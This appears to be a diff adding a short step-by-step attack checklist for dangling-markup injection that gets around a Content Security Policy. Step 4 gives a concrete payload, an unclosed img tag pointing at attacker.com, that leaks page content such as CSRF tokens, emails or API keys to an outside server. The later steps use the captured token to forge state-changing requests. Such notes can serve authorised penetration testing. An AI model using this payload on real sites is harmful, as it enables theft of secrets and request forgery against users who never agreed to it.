@@ -1,0 +1,7 @@
+1. Confirm CSP blocks script execution.
+2. Check if img-src or connect-src allows external origins.
+3. Identify sensitive data on the same page as the reflection (CSRF token, email, API key).
+4. Inject: "><img src='https://attacker.com/?x=
+5. Monitor attacker server — incoming request URL will contain page content.
+6. Parse CSRF token from the captured data.
+7. Use CSRF token to forge state-changing request.
